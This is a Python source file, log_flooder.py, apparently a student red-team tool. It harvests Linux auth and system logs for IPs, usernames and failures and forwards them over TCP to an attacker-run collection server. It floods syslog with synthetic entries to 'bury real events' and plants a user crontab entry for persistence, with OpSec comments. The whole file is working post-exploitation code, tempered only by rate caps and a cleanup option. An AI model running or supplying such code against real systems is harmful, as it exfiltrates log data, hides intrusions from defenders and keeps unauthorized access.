#!/usr/bin/env python3
# Seonho Park, scp4941@rit.edu

import os, re, sys, json, time, socket, argparse, hashlib, threading, subprocess, pwd, grp, signal
from datetime import datetime, timezone
from pathlib import Path
from collections import defaultdict
import logging
from logging.handlers import SysLogHandler

# ---------------- CONFIG ----------------

MAX_RATE = 50          # max messages/sec as a DOS safeguard
MAX_DURATION = 300     # seconds; 300s = 5 min cap

DEFAULT_LOGS = [
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/messages",
    "/var/log/secure",
]

STORAGE_DIR = Path("./rt_logs")
SYSLOG_SOCKET = "/dev/log"
DEFAULT_PORT  = 5140         # default TCP port for log forwarding

# ---------------- ENV ----------------

def is_root():
    return os.geteuid() == 0

def readable_logs(paths):
    """
    Filter to only readable files that actually exist.
    """
    readable_files = []
    
    for path in paths:
        # Check if the path points to an actual file
        if not os.path.isfile(path):
            continue
            
        # Check if the file is readable by the current user
        if not os.access(path, os.R_OK):
            continue
            
        readable_files.append(path)
    
    return readable_files

def current_user_info() -> dict:
    """
    Return the current process's user/group info via pwd/grp (Linux stdlib).
    """
    uid = os.geteuid()
    gid = os.getegid()
    try:
        uname = pwd.getpwuid(uid).pw_name
    except KeyError:
        uname = str(uid)
    try:
        gname = grp.getgrgid(gid).gr_name
    except KeyError:
        gname = str(gid)
    return {"uid": uid, "gid": gid, "user": uname, "group": gname}

# ---------------- LOG READING ----------------

def read_logs(paths):
    """
    Read log files and return (path, line) tuples.
    Handles missing files and encoding errors gracefully.
    """
    entries = []
    for p in readable_logs(paths):
        try:
            with open(p, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        entries.append((p, line))
        except (IOError, OSError) as e:
            print(f"[!] Failed to read {p}: {e}", file=sys.stderr)
            continue
    return entries

# ---------------- ANALYSIS ----------------

IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
USER_RE = re.compile(r"user(?:name)?[=:\s]+([a-zA-Z0-9_@.-]+)", re.I)
FAIL_RE = re.compile(
    r"(failed|failure|invalid|unauthorized|denied|error|refused|rejected)",
    re.I,
)
PORT_RE = re.compile(r"\bport\s+(\d{1,5})\b", re.I)
SERVICE_RE = re.compile(r"\b([a-zA-Z0-9_-]+)\[(\d+)\]:")

def extract_users(line: str) -> list:
    """Extract deduplicated usernames from a syslog line."""
    seen  = set()
    users = []
    for match in USER_RE.finditer(line):
        for group in match.groups():
            if group and group not in seen:
                seen.add(group)
                users.append(group)
                break
    return users

def analyze(paths, keywords):
    """
    Analyze logs for IPs, users, ports, and keyword matches.
    Returns list of findings with extracted metadata.
    """
    findings = []

    for path in paths:
        if not os.path.isfile(path) or not os.access(path, os.R_OK):
            continue
        try:
            with open(path, "r", errors="ignore") as fh:
                for raw_line in fh:
                    line = raw_line.strip()
                    if not line:
                        continue

                    matched_kw = [kw for kw in keywords if kw.lower() in line.lower()]
                    ips        = IP_RE.findall(line)
                    users      = extract_users(line)
                    ports      = PORT_RE.findall(line)
                    flags      = []

                    svc_m   = SERVICE_RE.search(line)
                    service = [svc_m.group(1), svc_m.group(2)] if svc_m else None

                    if FAIL_RE.search(line):
                        flags.append("auth_failure_or_error")

                    if matched_kw or ips or users or flags:
                        findings.append({
                            "source":    path,
                            "line":      line,
                            "timestamp": datetime.now(timezone.utc).isoformat(),
                            "ips":       ips,
                            "users":     users,
                            "ports":     ports,
                            "service":   service,
                            "keywords":  matched_kw,
                            "flags":     flags,
                            "hash":      hashlib.sha256(line.encode()).hexdigest(),
                        })
        except OSError:
            continue

    return findings

# ---------------- STORAGE ----------------

def save_findings(data, folder):
    """
     Save findings to JSON with secure permissions (0600).
    """
    folder.mkdir(exist_ok=True)
    name = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    file = folder / f"findings_{name}.json"

    with open(file, "w") as f:
        json.dump(data, f, indent=2)

    os.chmod(file, 0o600)
    print(f"[+] File permissions set to 0600")
          
    return file

def load_findings(storage_dir: Path) -> list:
    """
    Merge all previously saved findings from *storage_dir*, deduplicating by
    SHA-256 hash.
    """
    if not storage_dir.is_dir():
        return []

    seen   = set()
    merged = []

    for jf in sorted(storage_dir.glob("findings_*.json")):
        try:
            with open(jf) as fh:
                data = json.load(fh)
            for entry in data.get("findings", []):
                h = entry.get("hash", "")
                if h and h not in seen:
                    seen.add(h)
                    merged.append(entry)
        except (json.JSONDecodeError, OSError):
            continue

    return merged

# ---------------- SUMMARY ----------------

def summarize(findings: list) -> dict:
    """
    Produce a concise situational-awareness summary of collected findings.
    """
    ip_counts     = defaultdict(int)
    user_counts   = defaultdict(int)
    flag_counts   = defaultdict(int)
    svc_counts    = defaultdict(int)
    source_counts = defaultdict(int)

    for f in findings:
        for ip   in f.get("ips",   []):
            ip_counts[ip] += 1
        for user in f.get("users", []):
            user_counts[user] += 1
        for flag in f.get("flags", []):
            flag_counts[flag] += 1
        
        svc = f.get("service")
        if svc and len(svc) > 0:
            svc_counts[svc[0]] += 1
        
        source_counts[f["source"]] += 1

    return {
        "total_findings":   len(findings),
        "top_ips":          sorted(ip_counts.items(),   key=lambda x: -x[1])[:10],
        "top_users":        sorted(user_counts.items(), key=lambda x: -x[1])[:10],
        "top_services":     sorted(svc_counts.items(),  key=lambda x: -x[1])[:10],
        "flag_counts":      dict(flag_counts),
        "findings_by_file": dict(source_counts),
    }

# ---------------- FORWARD ----------------

class Forwarder:
    """
    Lightweight TCP log forwarder.

    Sends each finding as a newline-delimited JSON record prefixed with a
    4-byte big-endian length header.  Also works with a plain `nc -l <port>`
    listener on the receiving end for quick testing.
    """

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host    = host
        self.port    = port
        self.timeout = timeout

    def connect(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.host, self.port))
        return sock

    def send(self, findings: list) -> tuple:
        sent = failed = 0
        try:
            sock = self.connect()
            print(f"[+] Connected to {self.host}:{self.port}")
        except (ConnectionRefusedError, OSError) as exc:
            print(f"[-] Cannot connect to {self.host}:{self.port} — {exc}")
            return 0, len(findings)

        try:
            for i, finding in enumerate(findings):
                try:
                    payload = (json.dumps(finding) + "\n").encode()
                    header = len(payload).to_bytes(4, "big")
                    print(f"[DEBUG] Sending record {i+1}: {len(payload)} bytes")
                    sock.sendall(header + payload)
                    sent += 1
                except OSError as exc:
                    print(f"[-] Send error: {exc}")
                    failed += 1
                    break
            
            print(f"[DEBUG] All data sent ({sent} records), closing connection")
            sock.shutdown(socket.SHUT_WR)
            time.sleep(0.2)
        finally:
            sock.close()

        return sent, failed



    def send_raw_lines(self, entries: list) -> tuple:
        """Wrap raw (path, line) entries in a JSON envelope and forward."""
        now = datetime.now(timezone.utc).isoformat()
        return self.send([
            {"source": p, "line": l, "timestamp": now}
            for p, l in entries
        ])
    
# ---------------- Server ----------------

    
class Server:
    """
    TCP server that receives forwarded log entries and writes them to disk.

    Multi-threaded: several target boxes can connect simultaneously.
    Handles SIGTERM and SIGINT for graceful shutdown.

    Run on your Red Team Linux box:
        python3 log_flooder.py --serve --bind 0.0.0.0 --port 5140
    """

    def __init__(self, host: str, port: int, storage_dir: Path):
        self.host        = host
        self.port        = port
        self.storage_dir = storage_dir
        self.lock       = threading.Lock()
        self.buffer     = []
        self.running    = False

    def handle_client(self, conn: socket.socket, addr: tuple) -> None:
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        received = 0
        conn.settimeout(5.0)
        try:
            with conn:
                raw = b""
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            print(f"[DEBUG] Client closed connection, got {len(raw)} bytes total")
                            break
                        print(f"[DEBUG] Received {len(chunk)} bytes")
                        raw += chunk
                    except socket.timeout:
                        print(f"[DEBUG] Read timeout, proceeding with {len(raw)} bytes")
                        break
                
                # Parse records: [4-byte length][JSON\n][4-byte length][JSON\n]...
                offset = 0
                while offset < len(raw):
                    if offset + 4 > len(raw):
                        break  # Not enough bytes for length header
                    
                    length = int.from_bytes(raw[offset:offset+4], "big")
                    payload_start = offset + 4
                    payload_end = payload_start + length
                    
                    if payload_end > len(raw):
                        print(f"[DEBUG] Incomplete record at offset {offset}, breaking")
                        break
                    
                    record = raw[payload_start:payload_end]
                    offset = payload_end
                    
                    # Record should be: JSON\n
                    try:
                        record_str = record.decode('utf-8').strip()
                        if record_str:
                            with self.lock:
                                self.buffer.append(json.loads(record_str))
                            received += 1
                            print(f"[DEBUG] Parsed record {received}")
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[DEBUG] Parse error: {e}")
                        continue
        
        except OSError as e:
            print(f"[DEBUG] OSError: {e}")

        print(f"[+] {addr[0]}: received {received} entries")
        self.flush()


    def flush(self) -> None:
        with self.lock:
            if not self.buffer:
                return
            batch = self.buffer[:]
            self.buffer.clear()
        outfile = save_findings(batch, self.storage_dir)
        print(f"[+] Saved {len(batch)} entries → {outfile}")

    def stop(self, signum, frame) -> None:
        print("\n[+] Signal received — stopping server …")
        self.running = False
        
    def run(self):
        self.running = True
        signal.signal(signal.SIGTERM, self.stop)
        signal.signal(signal.SIGINT,  self.stop)

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.host, self.port))
        srv.listen(32)
        srv.settimeout(1.0)   # allows SIGINT to be caught promptly
        print(f"[+] Collection server listening on {self.host}:{self.port}")
        print(f"[+] Writing to {self.storage_dir}  (Ctrl-C to stop)")

        while self.running:
            try:
                conn, addr = srv.accept()
                threading.Thread(
                    target=self.handle_client, args=(conn, addr), daemon=True
                ).start()
            except socket.timeout:
                continue
            except OSError:
                break

        srv.close()
        self.flush()
        print("[+] Server stopped.")

# ---------------- FLOOD ----------------

def setup_syslog_logger() -> logging.Logger:
    """
    Configure a logger that writes to /dev/log (Linux syslog Unix socket).
    rsyslog and syslog-ng both listen on this socket on all major distros.
    """
    logger  = logging.getLogger("rt_flooder")
    logger.setLevel(logging.INFO)
    handler = SysLogHandler(address=SYSLOG_SOCKET)
    handler.setFormatter(logging.Formatter(f">w<: %(message)s"))
    logger.addHandler(handler)
    return logger


def flood_logs(rate: int, duration: int):
    """
    Write synthetic syslog entries at a controlled rate to bury real events.

    Rate and duration are capped at MAX_RATE / MAX_DURATION regardless of
    caller input.  Uses time.monotonic() to avoid wall-clock drift.
    """
    rate     = min(rate, MAX_RATE)
    duration = min(duration, MAX_DURATION)
    logger   = setup_syslog_logger()
    interval = 1.0 / rate
    deadline = time.monotonic() + duration
    counter  = 0
    next_send = time.monotonic()

    print(f"[+] Flooding syslog at {rate} msg/sec for {duration}s …")

    while time.monotonic() < deadline:
        now = time.monotonic()
        
        if now >= next_send:
            logger.info(
                f"simulation_event id={counter} "
                f"ts={datetime.now(timezone.utc).isoformat()} "
                f"status=ok src=127.0.0.1 dst=10.0.0.1"
            )
            counter += 1
            next_send += interval
        else:
            # Sleep just before next send time
            time.sleep(0.001)

    print(f"[+] Flood complete — {counter} entries written")


# ---------------- CRON ----------------

def python_bin() -> str:
    """
    Resolve the interpreter path from /proc/self/exe so we always persist the
    exact binary currently running, not a possibly different PATH entry.
    """
    return str(Path("/proc/self/exe").resolve())

def persist(script_path: str) -> bool:
    """
    Add a user crontab entry to re-run *script_path* every 5 minutes.

    No root required — uses the current user's personal crontab.

    OpSec: crontab -l is visible to all users; remove with --unpersist
    before cleanup.
    """
    cron_job = f"*/5 * * * * {python_bin()} {script_path}\n"
    try:
        result  = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        current = result.stdout if result.returncode == 0 else ""

        if cron_job.strip() in current:
            print("[*] Cron entry already present — skipping")
            return True

        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
        proc.communicate(input=current + cron_job)
        print(f"[+] Cron persistence added — runs every 5 min")
        return True
    except FileNotFoundError:
        print("[-] crontab not found — is cron installed?")
        return False
    except Exception as exc:
        print(f"[-] Cron setup failed: {exc}")
        return False

def unpersist(script_path: str) -> bool:
    """
    Remove the cron entry added by create_cron_persistence (cleanup).
    """
    cron_job = f"*/5 * * * * {python_bin()} {script_path}\n"
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if result.returncode != 0:
            print("[*] No crontab found for this user")
            return True
        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
        proc.communicate(input=result.stdout.replace(cron_job, ""))
        print("[+] Cron entry removed")
        return True
    except Exception as exc:
        print(f"[-] Cron removal failed: {exc}")
        return False

# ---------------- CLI ------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog = "log_flooder.py",
        description="Log collection and flooding tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
""",
    )
    
    io = parser.add_argument_group("Input")
    io.add_argument("--logs", nargs="*", default=DEFAULT_LOGS, metavar="PATH",
                    help="Log files to read (default: common Linux paths)")
    io.add_argument("--keywords", nargs="*",
                    default=["failed", "sudo", "root", "error", "invalid"],
                    metavar="KW", help="Keywords to flag during analysis")

    act = parser.add_argument_group("Actions")
    act.add_argument("--collect", action="store_true", help="Analyse logs and print findings")
    act.add_argument("--raw",     action="store_true", help="Print raw log lines (first 100)")
    act.add_argument("--save",    action="store_true", help="Save findings to local JSON store")
    act.add_argument("--summary", action="store_true", help="Summarise all stored findings")

    fwd = parser.add_argument_group("Forwarding")
    fwd.add_argument("--forward",  metavar="HOST", help="Forward findings to this host")
    fwd.add_argument("--port",     type=int, default=DEFAULT_PORT,
                     help=f"TCP port (default: {DEFAULT_PORT})")
    fwd.add_argument("--send-raw", action="store_true",
                     help="Forward raw lines instead of analysed findings")

    srv = parser.add_argument_group("Collection Server")
    srv.add_argument("--serve", action="store_true", help="Run collection server (blocks)")
    srv.add_argument("--bind",  default="0.0.0.0",   help="Bind address (default: 0.0.0.0)")

    nz = parser.add_argument_group("Noise Generation")
    nz.add_argument("--flood",    action="store_true", help="Generate syslog noise (root required)")
    nz.add_argument("--rate",     type=int, default=5,
                    help=f"Messages/sec, max {MAX_RATE} (default: 5)")
    nz.add_argument("--duration", type=int, default=30,
                    help=f"Seconds, max {MAX_DURATION} (default: 30)")

    ps = parser.add_argument_group("Persistence")
    ps.add_argument("--persist",   metavar="SCRIPT", help="Add cron entry for SCRIPT (every 5 min)")
    ps.add_argument("--unpersist", metavar="SCRIPT", help="Remove cron entry (cleanup)")

    st = parser.add_argument_group("Storage")
    st.add_argument("--storage-dir", default=str(STORAGE_DIR), metavar="DIR",
                    help=f"Local findings directory (default: {STORAGE_DIR})")

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    storage_dir = Path(args.storage_dir)
    ui = current_user_info()

    print(f"[+] log_flooder.py | user={ui['user']} uid={ui['uid']} | Linux")

    if args.raw:
        print("[+] Reading raw log entries …")
        entries = read_logs(args.logs)
        for path, line in entries[:100]:
            print(f"  [{path}] {line}")
        print(f"[+] {len(entries)} total raw entries")

    findings = []
    if args.collect:
        print(f"[+] Analysing logs — keywords: {args.keywords}")
        findings = analyze(args.logs, args.keywords)
        print(f"[+] {len(findings)} findings extracted")
        for f in findings[:50]:
            tags    = f["keywords"] + f["flags"]
            svc     = f["service"]
            svc_str = f"{svc[0]}[{svc[1]}]" if svc else "?"
            print(f"  [{f['source']}] {svc_str} [{', '.join(tags) or '—'}] {f['line'][:110]}")

    if args.save:
        if findings:
            out = save_findings(findings, storage_dir)
            print(f"[+] Findings saved → {out}  (chmod 600)")
        else:
            print("[*] Nothing to save — run --collect first")

    if args.summary:
        all_f = load_findings(storage_dir)
        if not all_f:
            print(f"[-] No stored findings in {storage_dir}")
        else:
            s = summarize(all_f)
            print(f"\n{'─'*50}\n  Findings Summary ({storage_dir})\n{'─'*50}")
            print(f"  Total            : {s['total_findings']}")
            print(f"  Flags            : {s['flag_counts']}")
            print("\n  Top IPs:")
            for ip, n in s["top_ips"]:
                print(f"    {ip:<22} {n:>5} hits")
            print("\n  Top Users:")
            for user, n in s["top_users"]:
                print(f"    {user:<22} {n:>5} hits")
            print("\n  Top Services (syslog process name):")
            for svc, n in s["top_services"]:
                print(f"    {svc:<22} {n:>5} hits")
            print("\n  By Log File:")
            for src, n in s["findings_by_file"].items():
                print(f"    {src:<42} {n:>5}")

    if args.forward:
        forwarder = Forwarder(args.forward, args.port)
        if args.send_raw:
            print("[+] Forwarding raw log lines …")
            sent, failed = forwarder.send_raw_lines(read_logs(args.logs))
        else:
            if not findings:
                print("[*] No findings to forward — add --collect to this invocation")
                sys.exit(0)
            sent, failed = forwarder.send(findings)
        print(f"[+] Forwarded {sent} to {args.forward}:{args.port}  (failed: {failed})")

    if args.serve:
        Server(args.bind, args.port, storage_dir).run()
        return
    
    if args.flood:
        if not is_root():
            print("[-] --flood requires root (uid 0)")
            sys.exit(1)
        if not Path(SYSLOG_SOCKET).exists():
            print(f"[-] {SYSLOG_SOCKET} not found — is rsyslog/syslog-ng running?")
            sys.exit(1)
        flood_logs(args.rate, args.duration)

    if args.persist:
        persist(args.persist)

    if args.unpersist:
        unpersist(args.unpersist)

    if not any([
        args.raw, args.collect, args.save, args.summary,
        args.flood, args.persist, args.unpersist,
    ]):
        parser.print_help()

if __name__ == "__main__":
    main()
